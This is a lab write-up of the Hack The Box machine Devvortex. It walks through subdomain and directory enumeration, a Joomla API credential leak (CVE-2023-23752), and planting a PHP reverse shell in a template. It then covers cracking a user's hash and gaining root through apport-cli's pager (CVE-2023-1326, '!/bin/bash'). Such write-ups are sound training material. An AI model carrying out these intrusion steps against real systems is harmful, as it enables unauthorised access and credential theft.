# HTB-Devvortex

This machine can be viewed at: https://app.hackthebox.com/machines/577

##Phase 1: Initial Foothold

As usual, we begin by scanning for open ports using an nmap syn scan. We quickly find that the machine only has SSH and HTTP up. Following this, we use a version scan to find extra information about the services that are shown available.

```
sudo nmap -sCV -p 22,80 -oN targeted $IP
[sudo] password for rat: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-16 12:44 UTC
Nmap scan report for devvortex.htb (10.10.11.242)
Host is up (0.072s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DevVortex
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.59 seconds
```

We head towards the webpage to see if there's any way we can access the machine.

![image](https://github.com/Rapfael01/Write-ups/assets/70867743/43a921eb-00a0-41ce-b37a-600430f1b6a8)

I ran a couple GoBuster scans with different word lists to try to find any hidden pages, since the ones that were available did not have any apparent vulnerabilities that I could exploit. So maybe that wasn't the right path. Maybe another subdomain? For this end, we use [ffuf](https://github.com/ffuf/ffuf) to enumerate existing subdomains.

```
ffuf -w /usr/share/SecLists-master/Discovery/DNS/subdomains-top1million-20000.txt -u http://devvortex.htb -H "Host: FUZZ.devvortex.htb" -fw 4

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb
 :: Wordlist         : FUZZ: /usr/share/SecLists-master/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.devvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 129ms]
:: Progress: [19966/19966] :: Job [1/1] :: 439 req/sec :: Duration: [0:00:42] :: Errors: 0 ::
```
Just that! They own a development subdomain.

![image](https://github.com/Rapfael01/Write-ups/assets/70867743/d938251c-708c-4740-b539-6625d825e9b2)

We run a GoBuster scan and we get wildly different results.

```
gobuster dir -u http://dev.devvortex.htb -w /usr/share/SecLists-master/Discovery/Web-Content/raft-medium-directories.txt -x html,txt,js,css,php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.devvortex.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/SecLists-master/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,js,css,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/images/]
/includes             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/includes/]
/modules              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/modules/]
/templates            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/templates/]
/cache                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/cache/]
/media                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/media/]
/language             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/language/]
/tmp                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/tmp/]
/plugins              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/plugins/]
/administrator        (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/administrator/]
/components           (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/components/]
/libraries            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/libraries/]
/api                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/api/]
/home                 (Status: 200) [Size: 23221]
/index.php            (Status: 200) [Size: 23221]
```
Before we explore any of the subdomains, it's always good practice to check for robots.txt and sitemap.xml.

![image](https://github.com/Rapfael01/Write-ups/assets/70867743/12b62ead-01e7-4601-ba1d-a575c06c07df)

Disallow /joomla/administrator? We find out we're facing a joomla webpage. Utilizing some enumeration tips provided by [HackTricks](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwiZ4JrugpSDAxWfPkQIHdIFBmgQFnoECAgQAQ&url=https%3A%2F%2Fbook.hacktricks.xyz%2Fnetwork-services-pentesting%2Fpentesting-web%2Fjoomla&usg=AOvVaw0ii4l5hm2LSpb0gOClURRL&opi=89978449), we find out the Joomla version we're facing is version 4.2.6 by entering /administrator/manifests/files/joomla.xml.

![image](https://github.com/Rapfael01/Write-ups/assets/70867743/c10e994f-7f2f-4987-bdf6-36f226fee941)

This version is vulnerable to an information disclosure vulnerability identified as CVE-2023-23752. While researching this vulnerability, I found this great [article](https://vulncheck.com/blog/joomla-for-rce) written by (Jacob Baines)[https://www.linkedin.com/in/jacob-baines-1490a7189/] that goes over the vulnerability. Basically, this vulnerability allows you to make certain API calls that allow you to either disclose database users+passwords or Joomla users only. Both are extremely valuable and can be used to run credential stuffing attacks as a last resort. We will be making these api calls through the web page so we can have better visibility of the data provided.

We find out there are two Joomla users registered, Logan and Lewis.

![image](https://github.com/Rapfael01/Write-ups/assets/70867743/7e6a224d-0ca3-46ca-abd9-3486ce37ffad)

As for the SQL database users, we only have one, which is Lewis as well as his password.

![image](https://github.com/Rapfael01/Write-ups/assets/70867743/6ffc4704-6b02-4bdb-b98b-98d1678c6f5f)

We can try using Lewis' SQL password as his Joomla login password, since we can easily create a malicious PHP layout.

![image](https://github.com/Rapfael01/Write-ups/assets/70867743/bf9eb2a1-6b92-4aee-9b89-d26d0fff5605)

And just like that, we're in!

Now, in order to access the machine, we create a malicious PHP layout as mentioned before. We go into System>Templates and select Cassiopeia layout which is available right there.

![image](https://github.com/Rapfael01/Write-ups/assets/70867743/5264f397-5535-4e18-9d49-aeff39dc1393)

We will change the code that exists in error.php and change it for (PentestMonkey's PHP Reverse Shell code)[https://github.com/pentestmonkey/php-reverse-shell].

![image](https://github.com/Rapfael01/Write-ups/assets/70867743/097ba3dc-6f37-46ea-8b06-11c8f6eb6821)

To make things simpler, this version of Joomla tells you exactly which file you're modifying so you can easily run the malicious code.

![image](https://github.com/Rapfael01/Write-ups/assets/70867743/4bcdc005-17d2-45a2-a418-e72d1bb7623d)

Now, we set up our nc listener and run the code and stabilize the shell, and boom! We're in!

![image](https://github.com/Rapfael01/Write-ups/assets/70867743/079a61bc-741d-44ec-90f0-701adbc34e98)

## Phase 2: User PrivEsc

Now that we have access to the machine, we enumerate existing users with a terminal available.

```
www-data@devvortex:/$ cat /etc/passwd | grep "bash"
root:x:0:0:root:/root:/bin/bash
logan:x:1000:1000:,,,:/home/logan:/bin/bash
```
There's only two users, root and logan. As we know, we already have access to the SQL database by utilizing Lewis' credentials which we obtained through the API calls. We can start our enumeration here.

```
www-data@devvortex:/$ mysql -u lewis -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 5988
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
```

Enumerating a little bit, we find out there is a database named Joomla and a users table. And by selecting everything from this table, we find something very, very interesting.

![image](https://github.com/Rapfael01/Write-ups/assets/70867743/045f3328-75f4-4feb-bcea-18acaa40e274)

We find Logan's password hash! We copy this to our local machine and use John to decrypt it.

```
john logan.hash --wordlist=/usr/share/Wordlists/rockyou.txt --format=bcrypt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
No password hashes left to crack (see FAQ)
```

We try to log in to SSH using logan's credentials.

```
ssh logan@10.10.11.242
logan@10.10.11.242's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 16 Dec 2023 01:41:44 PM UTC

  System load:  0.08              Processes:             164
  Usage of /:   67.4% of 4.76GB   Users logged in:       0
  Memory usage: 18%               IPv4 address for eth0: 10.10.11.242
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Dec 16 10:38:16 2023 from 10.10.14.69
logan@devvortex:~$
```
And we have user access!

## Phase 3: PrivEsc to root.

Since we have the password, we can check if logan can execute anything as root.

```
logan@devvortex:~$ sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

After researching a little bit, we find out about CVE-2023-1326, which affects versions of this application up to 2.26.0. So, we first confirm whether or not we can execute this exploit by checking the version.
```
logan@devvortex:~$ sudo /usr/bin/apport-cli --version
2.20.11
```
We're good to go then. The privilege escalation vector consists in exploiting an instance of less being executed during the process of error reporting, which can be utilized to run a bash instance with root permissions. First, we use the flag --file-bug to force the bug report screen.

```
logan@devvortex:~$ sudo /usr/bin/apport-cli --file-bug

*** What kind of problem do you want to report?


Choices:
  1: Display (X.org)
  2: External or internal storage devices (e. g. USB sticks)
  3: Security related problems
  4: Sound/audio related problems
  5: dist-upgrade
  6: installation
  7: installer
  8: release-upgrade
  9: ubuntu-release-upgrader
  10: Other problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/9/10/C): 
```
We can choose any option really as long as we get said less instance. We'll go for 1, and on the following prompt we'll go for 2.

```
Please choose (1/2/3/4/5/6/7/8/9/10/C): 1


*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.

*** What display problem do you observe?


Choices:
  1: I don't know
  2: Freezes or hangs during boot or usage
  3: Crashes or restarts back to login screen
  4: Resolution is incorrect
  5: Shows screen corruption
  6: Performance is worse than expected
  7: Fonts are the wrong size
  8: Other display-related problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/C): 2

*** 

To debug X freezes, please see https://wiki.ubuntu.com/X/Troubleshooting/Freeze

Press any key to continue... d
..dpkg-query: no packages found matching xorg
.................
```

After this, we should get this little screen.

```
*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (1.5 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C):
```
We have to choose View Report in order to get the less instance. Now, we type !/bin/bash in there and...

![image](https://github.com/Rapfael01/Write-ups/assets/70867743/491e5ab9-ae7d-4b02-b10a-9ea64560c250)

![image](https://github.com/Rapfael01/Write-ups/assets/70867743/95b8e687-036d-45a8-9d1e-be2e3f365fdd)

We are now root!

## Lessons

Overall this machine was pretty simple to solve. Other than learning about new CVEs, it mostly served to practice my already learned abilities.
